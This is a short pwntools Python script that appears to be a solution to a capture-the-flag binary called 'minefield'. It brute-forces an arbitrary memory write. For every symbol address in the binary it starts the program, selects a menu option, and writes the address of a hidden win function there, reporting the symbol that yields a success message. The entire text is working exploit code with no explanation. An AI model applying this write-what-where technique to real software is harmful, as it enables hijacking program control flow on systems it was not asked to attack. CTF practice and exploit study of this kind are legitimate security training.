from pwn import *

if __name__ == "__main__":
    BIN = ELF("./minefield")
    win_func = str(BIN.symbols["_"])

    for sym, addr in BIN.symbols.items():
        try:
            io = process("./minefield")
            io.recvuntil("> ")
            io.sendline("2")
            io.recvuntil(": ")
            io.sendline(str(addr))
            io.recvuntil(": ")
            io.sendline(win_func)
            res = io.recv(1024)
            if b"Mission" in res:
                print("FOUND: ", sym, ",", res, ", ", str(addr))
            else:
                print(res)
        except:
            continue
